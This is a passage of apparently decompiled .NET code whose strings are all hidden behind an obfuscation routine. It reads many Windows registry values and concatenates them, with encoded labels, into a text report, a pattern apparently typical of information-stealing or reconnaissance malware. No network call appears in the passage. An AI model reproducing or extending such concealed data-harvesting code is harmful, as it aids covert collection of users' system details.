						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Mťɤ\u0366ШԶر\u0735࠵सਸ\u0b3a")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑓᕝᙎᝎᡙ᥅ᩓᭉ᱇ᵦṼί⁼Ⅰ≹⍨⑾╸♖❈⡦⥩⩩⬥ⰵⴴ⸲⼰"), GClass0.smethod_0("[Ţɴ\u036cѥկ\u064cݮ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_128b;
						IL_128b:
						num = 99;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶᱈ᵛṏ\u1f47⁈⅔≌⍍⑽╡♬❶⡼⥱⩫\u2b75ⱶⴸ⹀⽿ほㅛ㉣㍦㑸㕽㙦㝴㡨㥾㨫㭚㱥㵩㹳㽯䁫䅱䉮䌢䐲"), GClass0.smethod_0("Hŧɸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_12bb;
						}
						goto IL_1312;
						IL_12bb:
						num = 100;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("bőɉ\u0341Ѳծٲݳ࠻\u094d\u0a70୶ౘ൦\u0e61\u0f7dၾᅻቫ፵ᑽᔮᙝᝠᡪ\u197e\u1a60᭦ᱲᵫḥἷ‸ℸ∺")), Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶᱈ᵛṏ\u1f47⁈⅔≌⍍⑽╡♬❶⡼⥱⩫\u2b75ⱶⴸ⹀⽿ほㅛ㉣㍦㑸㕽㙦㝴㡨㥾㨫㭚㱥㵩㹳㽯䁫䅱䉮䌢䐲"), GClass0.smethod_0("Hŧɸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1312;
						IL_1312:
						num = 102;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("{Źɴ\u0369Ѱբ٢ݯࡪ०੶\u0b65౦\u0d65\u0e6d\u0f6d\u106dᅧች፳ᑐᕘᙉᝋᡚ᥈\u1a5c\u1b44᱗ᵥṡή⁸ⅷ≍⍜\u244c┻♑❞⡮⥭⩠⭻ⱳ\u2d74\u2e64⽰なㅭ㉯"), GClass0.smethod_0("^Ťɥ\u0367Ѥխإ\u0747\u086c०\u0a64"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1342;
						}
						goto IL_1399;
						IL_1342:
						num = 103;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Rńȱ\u0346Ѡէٮݩ\u082b\u0949\u0a61୩౩ൡ\u0e60\u0f76\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("{Źɴ\u0369Ѱբ٢ݯࡪ०੶\u0b65౦\u0d65\u0e6d\u0f6d\u106dᅧች፳ᑐᕘᙉᝋᡚ᥈\u1a5c\u1b44᱗ᵥṡή⁸ⅷ≍⍜\u244c┻♑❞⡮⥭⩠⭻ⱳ\u2d74\u2e64⽰なㅭ㉯"), GClass0.smethod_0("^Ťɥ\u0367Ѥխإ\u0747\u086c०\u0a64"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1399;
						IL_1399:
						num = 105;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶ᱬᵄṂὅ⁑⅖≌⍌⑈╃☿❟⡯⥨⩨⭆ⱜⵙ⸷⽑ごㅙ㉖㍁㑍㕒㙮㝺㡹㥠㩮㭬㱠㵭㹫㽢䀥䄵䈺䌶䐳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_13c9;
						}
						goto IL_1420;
						IL_13c9:
						num = 106;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Qųɥ\u0364ѣի٫ݥ\u086e०੭ନశ\u0d3f\u0e31༶\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶ᱬᵄṂὅ⁑⅖≌⍌⑈╃☿❟⡯⥨⩨⭆ⱜⵙ⸷⽑ごㅙ㉖㍁㑍㕒㙮㝺㡹㥠㩮㭬㱠㵭㹫㽢䀥䄵䈺䌶䐳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1420;
						IL_1420:
						num = 108;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0014Đȟ\u0300Їԛ\u0619ܖࠕट\u0a0dଜ\u0c11ഌฆ༄ဂᄎሖጚᐇᔁᘒ\u1712᠅ᤑᨇᬝᰅᵓṛ\u1f5e⁈ⅉ≕⍗\u2451╔☖❴⡆⥇⩁⭭Ⱶ\u2d6e⸎⽪ねㅦ㉯㍺㑴㕥㙇㝑㡐㥏㩇㭇㱉㵺㹲㽹䀼䄪䈣䌭䐪䔷䙅䝰䡷䥡䩷䭥䰰䵘乫佬偼兤剤卺吨啨噠圥塓奔婋孈"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1450;
						}
						goto IL_14a7;
						IL_1450:
						num = 109;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("hňɜ\u0353ъՀق\u074aࡇ\u094d\u0a44\u0b3fయതศ༩\u103aᅊች፴ᑤᕰᙠ\u1733ᡅᥴ\u1a71\u1b7fᱡᵣṿἫ\u2065Ⅿ∨⍐\u2451╌♍✸⠸⤺")), Registry.GetValue(GClass0.smethod_0("\u0014Đȟ\u0300Їԛ\u0619ܖࠕट\u0a0dଜ\u0c11ഌฆ༄ဂᄎሖጚᐇᔁᘒ\u1712᠅ᤑᨇᬝᰅᵓṛ\u1f5e⁈ⅉ≕⍗\u2451╔☖❴⡆⥇⩁⭭Ⱶ\u2d6e⸎⽪ねㅦ㉯㍺㑴㕥㙇㝑㡐㥏㩇㭇㱉㵺㹲㽹䀼䄪䈣䌭䐪䔷䙅䝰䡷䥡䩷䭥䰰䵘乫佬偼兤剤卺吨啨噠圥塓奔婋孈"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_14a7;
						IL_14a7:
						num = 111;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u001eĞȑ\u030aЍԝ؟܌ࠏ\u0901ਓଆఋഊ\u0e00༎ဈᄀመጐᐍᔇᘔᝨ\u187f\u196f\u1a79᭧᱿ᵕṝὔ⁂ⅇ≛⍝\u245b╒☐❮⡜⥙⩟⭷Ɐ\u2d68⸈⽠でㅨ㉡㍰㑾㕣㙁㝫㡪㥱㩹㭽㱳㵼㹴㽳䀶䄤䈭䌧䐠䔱䙄䝧䡫䤭䩞䭤䱫䵭丨佳偩儥剖卬呯啤"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_14d7;
						}
						goto IL_152e;
						IL_14d7:
						num = 112;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("fłɖ\u0355ьպٸݴ\u0879ॷ\u0a7eହ\u0c29മย༧\u1034ᅇቺ፴ᐰᕝᙡᝬᡨ\u192b\u1a7e᭦\u1c28ᵕṩὨ\u2061ℸ∸⌺")), Registry.GetValue(GClass0.smethod_0("\u001eĞȑ\u030aЍԝ؟܌ࠏ\u0901ਓଆఋഊ\u0e00༎ဈᄀመጐᐍᔇᘔᝨ\u187f\u196f\u1a79᭧᱿ᵕṝὔ⁂ⅇ≛⍝\u245b╒☐❮⡜⥙⩟⭷Ɐ\u2d68⸈⽠でㅨ㉡㍰㑾㕣㙁㝫㡪㥱㩹㭽㱳㵼㹴㽳䀶䄤䈭䌧䐠䔱䙄䝧䡫䤭䩞䭤䱫䵭丨佳偩儥剖卬呯啤"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_152e;
						IL_152e:
						num = 114;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱣᵉṁὀ⁖⅓≏⍱⑷╾☼❚⡨⥭⩫⭋ⱓⵔ⸴⽔びㅼ㉵㍼㑒㕏㙭㝿㡾㥥㩭㭡㱯㵠㹨㽧䀢䄳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_155e;
						}
						goto IL_15b5;
						IL_155e:
						num = 115;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("RŮɺ\u0379Ѡծ٬ݠ\u086d५\u0a62ଥశസ\u0e38༺")), Registry.GetValue(GClass0.smethod_0("\nĊȅ\u0366ѡձٳݸ\u087bॵ੧\u0b7a౷൶\u0e7c\u0f7aၼᅴቬ፼ᑡᕫᙸ\u177cᡫ\u197b\u1a6d᭻ᱣᵉṁὀ⁖⅓≏⍱⑷╾☼❚⡨⥭⩫⭋ⱓⵔ⸴⽔びㅼ㉵㍼㑒㕏㙭㝿㡾㥥㩭㭡㱯㵠㹨㽧䀢䄳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_15b5;
						IL_15b5:
						num = 117;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶ᱬᵄṂὅ⁑⅖≌⍌⑈╃☿❟⡯⥨⩨⭆ⱜⵙ⸷⽑ごㅙ㉖㍁㑍㕒㙮㝺㡹㥠㩮㭬㱠㵭㹫㽢䀥䄶䈲䌶䐳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_15e5;
						}
						goto IL_163c;
						IL_15e5:
						num = 118;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Sűɻͺѡթ٭ݣ\u086c।\u0a63ଦషവ\u0e37༰\u103b")), Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶ᱬᵄṂὅ⁑⅖≌⍌⑈╃☿❟⡯⥨⩨⭆ⱜⵙ⸷⽑ごㅙ㉖㍁㑍㕒㙮㝺㡹㥠㩮㭬㱠㵭㹫㽢䀥䄶䈲䌶䐳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_163c;
						IL_163c:
						num = 120;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\0Čȃ\u031cЛԏ؍܂ࠁॳ\u0a61୰౽൸\u0e72\u0f70ၶᅲቪ፦ᑛᕕᙆᝆᡑᥝᩋ\u1b71ᱩᵇṏὊ⁜⅕≉⍋\u244d╀☂❠⡒⥫⩭⭁ⱙⵚ⸺⽞すㅚ㉓㍆㑈㕑㙳㝥㡤㥣㩫㭫㱥㵮㹦㽭䀨䅑䉯䍠䑰䕭䙣䝬"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_166c;
						}
						goto IL_16c3;
						IL_166c:
						num = 121;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("TŴɠ\u0367Ѿմٶݦ\u086bॡ੨ଫ\u0c5cൠ\u0e6d\u0f73\u1068ᅤቩጸᐸᔺ")), Registry.GetValue(GClass0.smethod_0("\0Čȃ\u031cЛԏ؍܂ࠁॳ\u0a61୰౽൸\u0e72\u0f70ၶᅲቪ፦ᑛᕕᙆᝆᡑᥝᩋ\u1b71ᱩᵇṏὊ⁜⅕≉⍋\u244d╀☂❠⡒⥫⩭⭁ⱙⵚ⸺⽞すㅚ㉓㍆㑈㕑㙳㝥㡤㥣㩫㭫㱥㵮㹦㽭䀨䅑䉯䍠䑰䕭䙣䝬"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_16c3;
						IL_16c3:
						num = 123;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\fĈȇ\u0318Пճٱݾ\u087dॷ\u0a65୴౹൴\u0e7e\u0f7cၺᅶቮ።ᑟᕉᙚ\u175aᡍᥙᩏ᭵ᱭᵋṃ\u1f46⁐⅑≍⍏⑉╼☾❜⡮⥯⩩⭅ⱝⵖ⸶⽒さㅞ㉗㍂㑌㕍㙢㝬㡯㥠㨪㭨㱦㵣㸦㽒䁬䅪䉶䍤"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_16f3;
						}
						goto IL_174a;
						IL_16f3:
						num = 124;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("PŽɱ\u036cѥԭ٭ݥ\u086eऩ\u0a5f୯౯൱\u0e61༸\u1038ᄺ")), Registry.GetValue(GClass0.smethod_0("\fĈȇ\u0318Пճٱݾ\u087dॷ\u0a65୴౹൴\u0e7e\u0f7cၺᅶቮ።ᑟᕉᙚ\u175aᡍᥙᩏ᭵ᱭᵋṃ\u1f46⁐⅑≍⍏⑉╼☾❜⡮⥯⩩⭅ⱝⵖ⸶⽒さㅞ㉗㍂㑌㕍㙢㝬㡯㥠㨪㭨㱦㵣㸦㽒䁬䅪䉶䍤"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_174a;
						IL_174a:
						num = 126;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("uŷɾ\u0363Ѧմٸݵ\u0874ॸ੬\u0b7f\u0c70൳\u0e67ཧ\u1063ᅩቷ፹ᑆᕎᙓᝑᡄᥖᩆ\u1b7eᱤᵌṺώ\u2069Ⅾ≴⍴⑰╻☷❗⡧⥠⩠⭎ⱓ\u2d7c\u2e6e⽭てㄬ㉪㍤㑭㔨㙐㝮㡬㥰㩦㬢㰳"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_177a;
						}
						goto IL_17d1;
						IL_177a:
						num = 127;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("VſɳͲѻԯٯݣࡨफ\u0a5dୡౡ൳\u0e63༥\u1036ᄸሸጺ")), Registry.GetValue(GClass0.smethod_0("uŷɾ\u0363Ѧմٸݵ\u0874ॸ੬\u0b7f\u0c70൳\u0e67ཧ\u1063ᅩቷ፹ᑆᕎᙓᝑᡄᥖᩆ\u1b7eᱤᵌṺώ\u2069Ⅾ≴⍴⑰╻☷❗⡧⥠⩠⭎ⱓ\u2d7c\u2e6e⽭てㄬ㉪㍤㑭㔨㙐㝮㡬㥰㩦㬢㰳"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_17d1;
						IL_17d1:
						num = 129;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u000fčȀ\u031dМԎ؎܃\u087eॲ\u0a62ୱ౺൹\u0e71\u0f71ၹᅳቩ፧ᑼᕴᙥᝧᡮ\u197c\u1a68\u1b70ᱮᵆṌὋ⁓⅔≊⍊⑊╁☁❡⡭⥪⩮⭀ⱞⵛ⸹⽟ぶㅻ㉰㍧㑏㕐㙾㝥㡣㥪㩨㭾㰫㵎㹨㽻䁯䄦䉗䍫䑠䕩䙲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1804;
						}
						goto IL_185e;
						IL_1804:
						num = 130;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("WŻɦ;ѵյٽܮࡉ७\u0a78\u0b62\u0c29൚\u0e68ཥၮᅷሸጸᐺ")), Registry.GetValue(GClass0.smethod_0("\u000fčȀ\u031dМԎ؎܃\u087eॲ\u0a62ୱ౺൹\u0e71\u0f71ၹᅳቩ፧ᑼᕴᙥᝧᡮ\u197c\u1a68\u1b70ᱮᵆṌὋ⁓⅔≊⍊⑊╁☁❡⡭⥪⩮⭀ⱞⵛ⸹⽟ぶㅻ㉰㍧㑏㕐㙾㝥㡣㥪㩨㭾㰫㵎㹨㽻䁯䄦䉗䍫䑠䕩䙲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_185e;
						IL_185e:
						num = 132;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶ᱬᵄṂὅ⁑⅖≌⍌⑈╃☿❟⡯⥨⩨⭆ⱜⵙ⸷⽑ぴㅹ㉶㍡㑍㕒㙺㝼㡣㥣㩾㭾㰩㵘㹦㽴䁤䅠䉪䍱䑤"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1891;
						}
						goto IL_18eb;
						IL_1891:
						num = 133;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Qŧɣ;Ѡջٹܬ\u085b५\u0a7b୩\u0c63൯\u0e76ཡ\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("\rďȆ\u031bОԌ\u0670ݽ\u087c॰\u0a64୷౸ൻ\u0e7f\u0f7fၻᅱቯ፡ᑾᕶᙻ\u1779ᡬ\u197e\u1a6e᭶ᱬᵄṂὅ⁑⅖≌⍌⑈╃☿❟⡯⥨⩨⭆ⱜⵙ⸷⽑ぴㅹ㉶㍡㑍㕒㙺㝼㡣㥣㩾㭾㰩㵘㹦㽴䁤䅠䉪䍱䑤"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_18eb;
						IL_18eb:
						num = 135;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42᱉ᵹṸὲ⁊ⅵ≾⍢⑽╈♐❳⡼⥤⩮⭽Ɽ\u2d6d⸫⽙ぽㅽ㉣㍯㑪㕘㘷㜬㠱"), GClass0.smethod_0("^Ůɭ\u0360ѻճ٣ݷࡡ१\u0a56୮"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_191e;
						}
						goto IL_1978;
						IL_191e:
						num = 136;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("XŻɴ\u036cѶեټݵ࠳\u0941\u0a65\u0b65౫൧\u0e62༬ဿᄤሹጨᑉᕧᙨᝡᠸ\u1938ᨺ")), Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42᱉ᵹṸὲ⁊ⅵ≾⍢⑽╈♐❳⡼⥤⩮⭽Ɽ\u2d6d⸫⽙ぽㅽ㉣㍯㑪㕘㘷㜬㠱"), GClass0.smethod_0("^Ůɭ\u0360ѻճ٣ݷࡡ१\u0a56୮"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1978;
						IL_1978:
						num = 138;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42᱉ᵹṸὲ⁊ⅵ≾⍢⑽╈♐❳⡼⥤⩮⭽Ɽ\u2d6d⸫⽙ぽㅽ㉣㍯㑪㕘㘷㜬㠱"), GClass0.smethod_0("]ūɪ\u0365Ѹվٻݩ\u0873९੪୪\u0c48൧\u0e78"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_19ab;
						}
						goto IL_1a05;
						IL_19ab:
						num = 139;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("YŸɵ\u0363ѷզٽݲ࠲\u0942\u0a64\u0b7a౪\u0d64\u0e63༫\u103eᄧሸጧᑍᕠᙽ\u1738ᠸ\u193a")), Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42᱉ᵹṸὲ⁊ⅵ≾⍢⑽╈♐❳⡼⥤⩮⭽Ɽ\u2d6d⸫⽙ぽㅽ㉣㍯㑪㕘㘷㜬㠱"), GClass0.smethod_0("]ūɪ\u0365Ѹվٻݩ\u0873९੪୪\u0c48൧\u0e78"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1a05;
						IL_1a05:
						num = 141;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑘᕐᙁᝃᡒ᥀ᩔ\u1b4cᱛᵫṮὤ\u2067Ⅻ≧⍬\u245b╅♭❶⡬⥯⩤"), GClass0.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1a38;
						}
						goto IL_1a92;
						IL_1a38:
						num = 142;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("JŠɵ\u0369Ѩաظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑘᕐᙁᝃᡒ᥀ᩔ\u1b4cᱛᵫṮὤ\u2067Ⅻ≧⍬\u245b╅♭❶⡬⥯⩤"), GClass0.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1a92;
						IL_1a92:
						num = 144;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("dŠɯͰѷի٩ݦࡥ९\u0a7d୬ౡ൜๖པၒᅞቆፊᑗᕑᙂᝂᡕ\u1941\u1a57\u1b4d᱓ᵠṪὨ\u206fÅ≞⍾⑭╦♭✥⡐⥬⩭⭭"), GClass0.smethod_0("uŠɶ\u036aѣխ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1ac5;
						}
						goto IL_1b1f;
						IL_1ac5:
						num = 145;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("PŽɵ\u0375ѬԮ\u0659ݻ\u086e५\u0a62ନ\u0c53൩\u0e6aཨ\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("dŠɯͰѷի٩ݦࡥ९\u0a7d୬ౡ൜๖པၒᅞቆፊᑗᕑᙂᝂᡕ\u1941\u1a57\u1b4d᱓ᵠṪὨ\u206fÅ≞⍾⑭╦♭✥⡐⥬⩭⭭"), GClass0.smethod_0("uŠɶ\u036aѣխ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1b1f;
						IL_1b1f:
						num = 147;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("uŷɾ\u0363Ѧմٸݵ\u0874ॸ੬\u0b7f\u0c70൳\u0e67ཧ\u1063ᅩቷ፹ᑦᕮᙳ\u1771ᡤ\u1976\u1a66\u1b7eᱤᵌṺώ\u2069Ⅾ≴⍴⑰╻☷❗⡧⥠⩠⭎ⱔⵑⸯ⽉がㅁ㉎㍙㑕㕏㙢㝨㡠㥶㩢㭮㱲"), GClass0.smethod_0("aűɥ\u0362"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1b52;
						}
						goto IL_1bac;
						IL_1b52:
						num = 148;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("\\űɰͱѺմٽ\u0738\u0876ॸ\u0a71\u0b34\u0c50ൽ\u0e7fཡၺᅫቿጬᑌᕯᙧ\u176dᡵᥧ\u1a69᭷\u1c38ᴸḺ")), Registry.GetValue(GClass0.smethod_0("uŷɾ\u0363Ѧմٸݵ\u0874ॸ੬\u0b7f\u0c70൳\u0e67ཧ\u1063ᅩቷ፹ᑦᕮᙳ\u1771ᡤ\u1976\u1a66\u1b7eᱤᵌṺώ\u2069Ⅾ≴⍴⑰╻☷❗⡧⥠⩠⭎ⱔⵑⸯ⽉がㅁ㉎㍙㑕㕏㙢㝨㡠㥶㩢㭮㱲"), GClass0.smethod_0("aűɥ\u0362"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1bac;
						IL_1bac:
						num = 150;
